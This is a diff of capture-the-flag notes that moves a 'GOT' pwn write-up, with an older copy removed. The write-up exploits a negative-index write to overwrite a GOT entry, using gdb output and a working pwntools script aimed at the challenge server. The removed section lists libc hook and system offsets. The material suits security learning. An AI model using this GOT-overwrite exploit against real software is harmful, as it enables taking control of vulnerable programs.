@@ -1,3 +1,263 @@
+# GOT #pwn 
+---
+> I just started to watch Game of Thrones ! :D
+
+```
+Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found 
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+```
+- the protections
+
+```
+./got
+Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?
+Which name is misspelled ?
+1. John
+2. Daenarys
+3. Bran
+4. Arya
+> 1
+Oh really ? What's the correct spelling ?
+> Jon
+Thanks for the help, next time i'll give you a shell, i already prepared it :)
+```
+- the program
+
+Disassembling the binary in `ghidra` we see that this is a ret2win style challenge. There is a shell function at the address of `0x4012b8`,
+
+```C
+void shell(void)
+
+{
+  system("/bin/sh");
+  return;
+}
+
+```
+- `shellfunc.c` 
+
+However with canaries being enabled we are prevented from doing a stack based buffer overflow and then supplying the return address of the shell function. 
+
+Game of Thrones -> GOT -> Global Offset Table ?
+
+The name of the challenge possibly hints at the path we need to take to get to the shell function. Since functions in the GOT are not on the stack but in .data we don't have to worry about the presence of canaries.
+
+Ok with all that said let's take a look at the `main` function that is in our program,
+
+```C
+undefined8 main(void)
+
+{
+  long in_FS_OFFSET;
+  int input1;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  input1 = 0;
+  puts("Hey ! I\'ve never seen Game of Thrones and i think i misspelled a name, can you help me ?");
+  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
+  fwrite(&DAT_004020a7,1,2,_stdout);
+  __isoc99_scanf(&DAT_004020aa,&input1);
+  if (4 < input1) {
+    puts("Huuuhhh, i do not know that many people yet...");
+                    /* WARNING: Subroutine does not return */
+    _exit(0);
+  }
+  puts("Oh really ? What\'s the correct spelling ?");
+  fwrite(&DAT_004020a7,1,2,_stdout);
+  read(0,PNJs + (long)input1 * 0x20,0x20);
+  puts("Thanks for the help, next time i\'ll give you a shell, i already prepared it :)");
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+
+```
+- `mainfunc.c` 
+
+Ok so the program puts out some text and then asks us for a number as an input, if the number is greater than 4, the program gracefully exits.
+
+![](IMG-20250303172514562.png)
+
+If we do supply a number less than 4, the program outputs some more text and gives us another chance to input,
+
+![](IMG-20250303203306853.png)
+- the program exits gracefully again 
+
+So where does the vulnerability lie? Take a closer look at the line `read(0,PNJs + (long)input1 * 0x20,0x20)`. The read function naturally takes three inputs: `read(fd, buf, size)` reads `0x20` bytes from the `stdin` into the buffer `PNJs + (long)input1 * 0x20 `. The key part here is,
+
+```
+PNJs + (long)input1 * 0x20
+```
+- this determines where the input will be written 
+
+Since we control `input1` we technically control where the input can be written. But isn't this well sanitized? We did see the program exits without a problem anytime a number greater than 4 is inputted. 
+
+Well take a closer look, `if (4 < input1)` only specifies the upper bound of the input... so we can technically go as low as we want to. 
+
+![](IMG-20250303210051011.png)
+- negative numbers are fine
+
+The only missing part we need is the address of `PNJs` which we can easily find with a clever breakpoint.
+
+If we set a breakpoint in gdb at the `read` function then check out the registers, the address of `PNJs + (long)input1 * 0x20` should be in `rsi` (the register where the second argument is held).
+
+Looking for PNJs. Breakpoint at `read@plt`.
+
+```C
+pwndbg> info registers
+rax            0x4040a0            4210848
+rbx            0x7fffffffdde8      140737488346600
+rcx            0x7ffff7eb6210      140737352786448
+rdx            0x20                32
+rsi            0x4040a0            4210848 // 0x4040a0 is our addr 
+rdi            0x0                 0
+rbp            0x7fffffffdcd0      0x7fffffffdcd0
+rsp            0x7fffffffdcb8      0x7fffffffdcb8
+r8             0xfe00              65024
+r9             0x0                 0
+r10            0x7ffff7f40fe0      140737353355232
+r11            0x202               514
+r12            0x0                 0
+r13            0x7fffffffddf8      140737488346616
+r14            0x7ffff7ffd000      140737354125312
+r15            0x403dd8            4210136
+rip            0x401076            0x401076 <read@plt+6>
+eflags         0x206               [ PF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+fs_base        0x7ffff7daf740      140737351710528
+gs_base        0x0                 0
+```
+
+Ok so we have the address of `PNJs +(long)input1 * 0x20` and we control `input1` so now where do we go? Well the first thing to think about is the shell function, but the address for that is on the stack. We've already discussed that canaries are present meaning that we will not be able to overwrite any address on the stack. 
+
+What about the `GOT` table functions we were talking about? Let's take a look,
+
+```C
+pwndbg> got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+State of the GOT of /home/kali/Desktop/ctfs/pwnme2025/GOT/got/got:
+GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
+[0x404000] _exit@GLIBC_2.2.5 -> 0x401036 (_exit@plt+6) ◂— push 0 /* 'h' */
+[0x404008] puts@GLIBC_2.2.5 -> 0x401046 (puts@plt+6) ◂— push 1
+[0x404010] __stack_chk_fail@GLIBC_2.4 -> 0x401056 (__stack_chk_fail@plt+6) ◂— push 2
+[0x404018] system@GLIBC_2.2.5 -> 0x401066 (system@plt+6) ◂— push 3
+[0x404020] read@GLIBC_2.2.5 -> 0x401076 (read@plt+6) ◂— push 4
+[0x404028] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e31f10 (setvbuf) ◂— push r13
+[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x401096 (__isoc99_scanf@plt+6) ◂— push 6
+[0x404038] fwrite@GLIBC_2.2.5 -> 0x4010a6 (fwrite@plt+6) ◂— push 7
+
+```
+- a lot of possibilities to jump to
+
+Well let's start with `_exit@plt`, our goal is to jump to this address with the 1st input and then overwrite it with our shell address through the 2nd input.
+
+Ok our equation is `PNJs + input1 * 0x20 = _exit@plt` and we are solving for input1. 
+
+```python
+pnjs_base = 0x4040a0
+exit_got = 0x404000
+
+input1 = (exit_got - pnjs_base) // 0x20
+print(input1)
+```
+- `input1 = -5`
+
+But wait PNJs arrays stores strings starting from index 1 not index 0 so the correct input1 would be -4. (I spent way too much time working with -5 as input1 and wondering why nothing was going as planned).
+
+We can double check that -4 is the correct input in gdb,
+
+![](IMG-20250303214629470.png)
+
+
+Ok, theoretically if we input -4 we should be able to overwrite the address stored in `exit@plt` with the address of the shell so when the program jumps to `exit@plt` it will then jump to the shell right after instead of exiting.  
+
+Theory is one thing, debugging is another.... so let's get into gdb.
+
+![](IMG-20250303215217121.png)
+- alright nice we receive a segfault which means we have overwritten something
+
+Let's take a look at what is stored in `exit@plt`,
+
+```C
+pwndbg> x/gx 0x404000
+0x404000 <_exit@got.plt>:       0x4141414141414141
+```
+- if we unhex `0x4141414141414141` we get `AAAAAAAA` which was part of our second input
+
+Nice so we have confirmed that we can overwrite `exit@plt`. But is this what we want...?
+
+RIP or the instruction pointer is currently pointing to `puts@plt` which means if the crash didn't happen the program would jump to the `puts` function. 
+
+![](IMG-20250304132456406.png)
+
+Ah this makes sense, `exit` is only called when `input1 > 4` and our `input1 = -4` so the program will not point to the `exit` function. 
+
+Going back to the GOT table above we see that the `puts@plt` address is at `0x404008` right after `exit@plt`. We've already overwrote this address with A's this time around but let's try again to make the offset clear. 
+
+Our 2nd input payload will be 8 A's since we need 8 bytes to fill up `exit@plt` and then we can send off 8 B's to fill up `puts@plt`.
+
+Alright let's send the payload and check,
+
+![](IMG-20250304134049159.png)
+![](IMG-20250304134212453.png)
+
+`0x4242424242424242` unhexed is `BBBBBBBB`. Nice, now all we have to do is switch out the B's for `0x4012b8`. Sending a hex address however is a tricky matter, we can convert it to little endian bytes but our program takes input as a string so if we send something like `\xb8\x12\x40`, only `\xb8\x12` will make it into `puts@plt`.
+
+This is no problem though, we can use `pwntools` to send the address.
+
+```python
+from pwn import *
+
+
+# p = process("./got") 
+
+# connect to the server
+p = remote("got-9b6744d8cc34c7cc.deploy.phreaks.fr", 443, ssl=True, sni="got-9b6744d8cc34c7cc.deploy.phreaks.fr") 
+
+# Send the first input (-4)
+p.sendlineafter(b">", b"-4")  
+
+# overwrite GOT entry with the address 0x4012b8
+payload = b"A" * 8 + p64(0x4012b8)  # 8 bytes of "A" + the address 
+
+# Send the payload
+p.sendlineafter(b">", payload)  # Wait for the prompt ">" and send the payload
+
+# Interact with the program 
+p.interactive()
+```
+- payload.py
+
+And now to retrieve the flag,
+
+```
+[x] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443
+[x] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443: Trying 34.77.142.216
+[+] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443: Done
+[*] Switching to interactive mode
+ cd ..
+pwd
+/
+cat flag
+PWNME{G0t_Ov3Rwr1t3_fTW__}
+```
+
+
 # Easy Diffy #crypto 
 ---
 > I managed to generate strong parameters for our diffie-hellman key exchange, i think my message is now safe.
@@ -261,312 +521,3 @@ print(flag)
 ```
 PWNME{Thi5_1s_H0w_pAl1ier_WorKs}
 ```
-
-
-
-# GOT #pwn 
----
-> I just started to watch Game of Thrones ! :D
-
-```
-Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found 
-    NX:         NX enabled
-    PIE:        No PIE (0x400000)
-    Stripped:   No
-    Debuginfo:  Yes
-
-```
-- the protections
-
-```
-./got
-Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?
-Which name is misspelled ?
-1. John
-2. Daenarys
-3. Bran
-4. Arya
-> 1
-Oh really ? What's the correct spelling ?
-> Jon
-Thanks for the help, next time i'll give you a shell, i already prepared it :)
-```
-- the program
-
-Disassembling the binary in `ghidra` we see that this is a ret2win style challenge. There is a shell function at the address of `0x4012b8`,
-
-```C
-void shell(void)
-
-{
-  system("/bin/sh");
-  return;
-}
-
-```
-- `shellfunc.c` 
-
-However with canaries being enabled we are prevented from doing a stack based buffer overflow and then supplying the return address of the shell function. 
-
-Game of Thrones -> GOT -> Global Offset Table ?
-
-The name of the challenge possibly hints at the path we need to take to get to the shell function. Since functions in the GOT are not on the stack but in .data we don't have to worry about the presence of canaries.
-
-Ok with all that said let's take a look at the `main` function that is in our program,
-
-```C
-undefined8 main(void)
-
-{
-  long in_FS_OFFSET;
-  int input1;
-  long local_10;
-  
-  local_10 = *(long *)(in_FS_OFFSET + 0x28);
-  input1 = 0;
-  puts("Hey ! I\'ve never seen Game of Thrones and i think i misspelled a name, can you help me ?");
-  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
-  fwrite(&DAT_004020a7,1,2,_stdout);
-  __isoc99_scanf(&DAT_004020aa,&input1);
-  if (4 < input1) {
-    puts("Huuuhhh, i do not know that many people yet...");
-                    /* WARNING: Subroutine does not return */
-    _exit(0);
-  }
-  puts("Oh really ? What\'s the correct spelling ?");
-  fwrite(&DAT_004020a7,1,2,_stdout);
-  read(0,PNJs + (long)input1 * 0x20,0x20);
-  puts("Thanks for the help, next time i\'ll give you a shell, i already prepared it :)");
-  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
-                    /* WARNING: Subroutine does not return */
-    __stack_chk_fail();
-  }
-  return 0;
-}
-
-```
-- `mainfunc.c` 
-
-Ok so the program puts out some text and then asks us for a number as an input, if the number is greater than 4, the program gracefully exits.
-
-![](IMG-20250303172514562.png)
-
-If we do supply a number less than 4, the program outputs some more text and gives us another chance to input,
-
-![](IMG-20250303203306853.png)
-- the program exits gracefully again 
-
-So where does the vulnerability lie? Take a closer look at the line `read(0,PNJs + (long)input1 * 0x20,0x20)`. The read function naturally takes three inputs: `read(fd, buf, size)` reads `0x20` bytes from the `stdin` into the buffer `PNJs + (long)input1 * 0x20 `. The key part here is,
-
-```
-PNJs + (long)input1 * 0x20
-```
-- this determines where the input will be written 
-
-Since we control `input1` we technically control where the input can be written. But isn't this well sanitized? We did see the program exits without a problem anytime a number greater than 4 is inputted. 
-
-Well take a closer look, `if (4 < input1)` only specifies the upper bound of the input... so we can technically go as low as we want to. 
-
-![](IMG-20250303210051011.png)
-- negative numbers are fine
-
-The only missing part we need is the address of `PNJs` which we can easily find with a clever breakpoint.
-
-If we set a breakpoint in gdb at the `read` function then check out the registers, the address of `PNJs + (long)input1 * 0x20` should be in `rsi` (the register where the second argument is held).
-
-Looking for PNJs. Breakpoint at `read@plt`.
-
-```C
-pwndbg> info registers
-rax            0x4040a0            4210848
-rbx            0x7fffffffdde8      140737488346600
-rcx            0x7ffff7eb6210      140737352786448
-rdx            0x20                32
-rsi            0x4040a0            4210848 // 0x4040a0 is our addr 
-rdi            0x0                 0
-rbp            0x7fffffffdcd0      0x7fffffffdcd0
-rsp            0x7fffffffdcb8      0x7fffffffdcb8
-r8             0xfe00              65024
-r9             0x0                 0
-r10            0x7ffff7f40fe0      140737353355232
-r11            0x202               514
-r12            0x0                 0
-r13            0x7fffffffddf8      140737488346616
-r14            0x7ffff7ffd000      140737354125312
-r15            0x403dd8            4210136
-rip            0x401076            0x401076 <read@plt+6>
-eflags         0x206               [ PF IF ]
-cs             0x33                51
-ss             0x2b                43
-ds             0x0                 0
-es             0x0                 0
-fs             0x0                 0
-gs             0x0                 0
-fs_base        0x7ffff7daf740      140737351710528
-gs_base        0x0                 0
-```
-
-Ok so we have the address of `PNJs +(long)input1 * 0x20` and we control `input1` so now where do we go? Well the first thing to think about is the shell function, but the address for that is on the stack. We've already discussed that canaries are present meaning that we will not be able to overwrite any address on the stack. 
-
-What about the `GOT` table functions we were talking about? Let's take a look,
-
-```C
-pwndbg> got
-Filtering out read-only entries (display them with -r or --show-readonly)
-
-State of the GOT of /home/kali/Desktop/ctfs/pwnme2025/GOT/got/got:
-GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
-[0x404000] _exit@GLIBC_2.2.5 -> 0x401036 (_exit@plt+6) ◂— push 0 /* 'h' */
-[0x404008] puts@GLIBC_2.2.5 -> 0x401046 (puts@plt+6) ◂— push 1
-[0x404010] __stack_chk_fail@GLIBC_2.4 -> 0x401056 (__stack_chk_fail@plt+6) ◂— push 2
-[0x404018] system@GLIBC_2.2.5 -> 0x401066 (system@plt+6) ◂— push 3
-[0x404020] read@GLIBC_2.2.5 -> 0x401076 (read@plt+6) ◂— push 4
-[0x404028] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e31f10 (setvbuf) ◂— push r13
-[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x401096 (__isoc99_scanf@plt+6) ◂— push 6
-[0x404038] fwrite@GLIBC_2.2.5 -> 0x4010a6 (fwrite@plt+6) ◂— push 7
-
-```
-- a lot of possibilities to jump to
-
-Well let's start with `_exit@plt`, our goal is to jump to this address with the 1st input and then overwrite it with our shell address through the 2nd input.
-
-Ok our equation is `PNJs + input1 * 0x20 = _exit@plt` and we are solving for input1. 
-
-```python
-pnjs_base = 0x4040a0
-exit_got = 0x404000
-
-input1 = (exit_got - pnjs_base) // 0x20
-print(input1)
-```
-- `input1 = -5`
-
-But wait PNJs arrays stores strings starting from index 1 not index 0 so the correct input1 would be -4. (I spent way too much time working with -5 as input1 and wondering why nothing was going as planned).
-
-We can double check that -4 is the correct input in gdb,
-
-![](IMG-20250303214629470.png)
-
-
-Ok, theoretically if we input -4 we should be able to overwrite the address stored in `exit@plt` with the address of the shell so when the program jumps to `exit@plt` it will then jump to the shell right after instead of exiting.  
-
-Theory is one thing, debugging is another.... so let's get into gdb.
-
-![](IMG-20250303215217121.png)
-- alright nice we receive a segfault which means we have overwritten something
-
-Let's take a look at what is stored in `exit@plt`,
-
-```C
-pwndbg> x/gx 0x404000
-0x404000 <_exit@got.plt>:       0x4141414141414141
-```
-- if we unhex `0x4141414141414141` we get `AAAAAAAA` which was part of our second input
-
-Nice so we have confirmed that we can overwrite `exit@plt`. But is this what we want...?
-
-RIP or the instruction pointer is currently pointing to `puts@plt` which means if the crash didn't happen the program would jump to the `puts` function. 
-
-![](IMG-20250304132456406.png)
-
-Ah this makes sense, `exit` is only called when `input1 > 4` and our `input1 = -4` so the program will not point to the `exit` function. 
-
-Going back to the GOT table above we see that the `puts@plt` address is at `0x404008` right after `exit@plt`. We've already overwrote this address with A's this time around but let's try again to make the offset clear. 
-
-Our 2nd input payload will be 8 A's since we need 8 bytes to fill up `exit@plt` and then we can send off 8 B's to fill up `puts@plt`.
-
-Alright let's send the payload and check,
-
-![](IMG-20250304134049159.png)
-![](IMG-20250304134212453.png)
-
-`0x4242424242424242` unhexed is `BBBBBBBB`. Nice, now all we have to do is switch out the B's for `0x4012b8`. Sending a hex address however is a tricky matter, we can convert it to little endian bytes but our program takes input as a string so if we send something like `\xb8\x12\x40`, only `\xb8\x12` will make it into `puts@plt`.
-
-This is no problem though, we can use `pwntools` to send the address.
-
-```python
-from pwn import *
-
-
-# p = process("./got") 
-
-# connect to the server
-p = remote("got-9b6744d8cc34c7cc.deploy.phreaks.fr", 443, ssl=True, sni="got-9b6744d8cc34c7cc.deploy.phreaks.fr") 
-
-# Send the first input (-4)
-p.sendlineafter(b">", b"-4")  
-
-# overwrite GOT entry with the address 0x4012b8
-payload = b"A" * 8 + p64(0x4012b8)  # 8 bytes of "A" + the address 
-
-# Send the payload
-p.sendlineafter(b">", payload)  # Wait for the prompt ">" and send the payload
-
-# Interact with the program 
-p.interactive()
-```
-- payload.py
-
-And now to retrieve the flag,
-
-```
-[x] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443
-[x] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443: Trying 34.77.142.216
-[+] Opening connection to got-9b6744d8cc34c7cc.deploy.phreaks.fr on port 443: Done
-[*] Switching to interactive mode
- cd ..
-pwd
-/
-cat flag
-PWNME{G0t_Ov3Rwr1t3_fTW__}
-```
-
-
-# Einstein #pwn 
----
-```
-    Arch:       amd64-64-little
-    RELRO:      Full RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        PIE enabled
-    Stripped:   No
-    Debuginfo:  Yes
-
-```
-
-
-```
-pwndbg> p &__free_hook
-$1 = (void (**)(void *, const void *)) 0x7ffff7fa0148 <__free_hook>
-pwndbg> p &__malloc_hook
-$2 = (void *(**)(size_t, const void *)) 0x7ffff7fa0140 <__malloc_hook>
-pwndbg> p &system
-$3 = (int (*)(const char *)) 0x7ffff7e048f0 <__libc_system>
-```
-
-```
-info proc mappings
-
-0x00007ffff7daf000 0x00007ffff7db2000 0x3000             0x0                rw-p   
-0x00007ffff7db2000 0x00007ffff7dda000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6                                                                                         
-0x00007ffff7dda000 0x00007ffff7f3f000 0x165000           0x28000            r-xp  /usr/lib/x86_64-linux
-```
-- base address should be 0x00007ffff7db2000
-
-
-```
-# calculating offsets
-
-0x7ffff7fa0148 - 0x00007ffff7db2000 # free_hook offset
-= 0x1EE148
-
-0x7ffff7fa0140 - 0x00007ffff7db2000 # malloc_hook offset
-=0x1EE140
-
-0x7ffff7e048f0 - 0x00007ffff7db2000 # system offset
-= 0x528F0
-```
-
